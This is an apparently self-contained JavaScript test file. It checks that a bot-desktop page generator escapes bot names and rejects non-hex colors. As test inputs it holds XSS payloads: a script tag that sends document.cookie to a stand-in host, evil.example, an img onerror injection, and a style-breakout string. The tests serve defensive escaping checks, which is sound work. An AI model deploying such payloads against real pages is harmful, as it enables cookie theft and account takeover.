// Tests for the pages Bops writes to a bot's computer to dress its desktop (lib/server/desktop.ts): the home screen on
// every new tab and the wallpaper. A bot's name (which a teammate can change through Bops Cloud) and every other text of
// the state in them are escaped, so a name with markup in it shows as written and never runs on the bot's computer; a
// color that isn't a hex color is a plain gray, so it can't break out of the page's style either. An ordinary name and
// color show as before.
//
// Pure: the pages are rendered here, and the modules that would reach Orgo or Jev are stand-ins. The bots are made up.
// Usage: node --conditions=react-server scripts/test-desktop-escape.mjs
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { registerHooks } from "node:module";
import { pathToFileURL } from "node:url";

const root = new URL("..", import.meta.url).pathname.replace(/\/$/, "");
// What desktop.ts talks to besides the pages: Jev (decide), Orgo, the screens and the state. Each export does nothing here.
const STAND_INS = new Set(["decide", "orgo", "screens", "store"]);
registerHooks({
  resolve(specifier, context, next) {
    if (specifier === "server-only") return { url: "data:text/javascript,", shortCircuit: true };
    if (specifier.startsWith("@/")) specifier = pathToFileURL(`${root}/${specifier.slice(2)}`).href;
    try {
      return next(specifier, context);
    } catch (e) {
      if (/^(\.{1,2}\/|\/|file:)/.test(specifier))
        for (const ext of [".ts", ".tsx"])
          try {
            return next(specifier + ext, context);
          } catch {}
      throw e;
    }
  },
  load(url, context, next) {
    const name = url.match(/\/lib\/server\/([a-z-]+)\.ts$/)?.[1];
    if (!name || !STAND_INS.has(name)) return next(url, context);
    const names = [...readFileSync(new URL(url), "utf8").matchAll(/^export (?:async )?(?:function\*? |const |let |class )([A-Za-z_$][\w$]*)/gm)].map((m) => m[1]);
    return { format: "module", shortCircuit: true, source: names.map((n) => `export const ${n} = function () { return undefined; };`).join("\n") };
  },
});

const D = await import(`${root}/lib/server/desktop.ts`);

let passed = 0;
const test = (name, f) => {
  f();
  passed++;
  console.log(`ok - ${name}`);
};

const bot = (o = {}) => ({ id: "max", name: "Max", role: "Ops", color: "#5B8CFF", isMain: false, computerId: "c1", computerStatus: "ready", ...o });
const SCRIPT = `<script>fetch("https://evil.example/?k="+document.cookie)</script>`;
/** The page's own <script> (the clock and the apps): every other one would be the name's. */
const scripts = (html) => [...html.matchAll(/<script\b/gi)].length;

test("escHtml: markup and quotes are text", () => {
  assert.equal(D.escHtml(`<b>"Max" & 'Ann'</b>`), "&lt;b&gt;&quot;Max&quot; &amp; &#39;Ann&#39;&lt;/b&gt;");
  assert.equal(D.escHtml("Max"), "Max");
});

test("the home screen: a name with <script> shows as written, in the title and the welcome, and adds no script", () => {
  const plain = D.home(bot(), "nature");
  const html = D.home(bot({ name: `Max${SCRIPT}` }), "nature");
  assert.equal(scripts(html), scripts(plain), "only the page's own script");
  assert.ok(!html.includes(SCRIPT));
  assert.ok(html.includes(`<title>Max&lt;script&gt;fetch(&quot;https://evil.example/?k=&quot;+document.cookie)&lt;/script&gt;</title>`));
  assert.ok(html.includes(`<h1>Welcome back, Max&lt;script&gt;`));
  // A name that closes the title or the heading early can't either.
  const early = D.home(bot({ name: `</title><img src=x onerror=alert(1)>` }), "nature");
  assert.ok(!/<img src=x/i.test(early));
  assert.ok(early.includes("&lt;/title&gt;&lt;img src=x onerror=alert(1)&gt;"));
});

test("an ordinary name and color show as before", () => {
  const html = D.home(bot({ name: "Ann's Bot" }), "inbox");
  assert.ok(html.includes("<title>Ann&#39;s Bot</title>"));
  assert.ok(html.includes("<h1>Welcome back, Ann&#39;s Bot</h1>"));
  assert.ok(html.includes("#5B8CFF"), "its color");
  assert.ok(D.wallpaper(bot(), "inbox").includes("#5B8CFF"));
});

test("a color that isn't a hex color is a plain gray: it can't close the page's style or add a script, home or wallpaper", () => {
  const evil = `red}</style>${SCRIPT}<style>`;
  for (const html of [D.home(bot({ color: evil }), "nature"), D.wallpaper(bot({ color: evil }), "nature")]) {
    assert.ok(!html.includes("</style><script"), "the style isn't closed early");
    assert.ok(!html.includes("evil.example"));
    assert.ok(html.includes("#9A9A98"));
  }
  assert.equal(D.cssColor("#abc"), "#abc");
  assert.equal(D.cssColor("#A1B2C3D4"), "#A1B2C3D4");
  for (const c of ["red", "#12", "#1234567890", "url(x)", undefined, 7]) assert.equal(D.cssColor(c), "#9A9A98", String(c));
});

test("a main bot's page: the same escaping", () => {
  const html = D.home(bot({ isMain: true, name: `<i>Nova</i>` }), "chief");
  assert.ok(html.includes("<title>&lt;i&gt;Nova&lt;/i&gt;</title>"));
  assert.ok(!html.includes("<i>Nova</i>"));
});

console.log(`\ndesktop escape: ${passed} passed`);
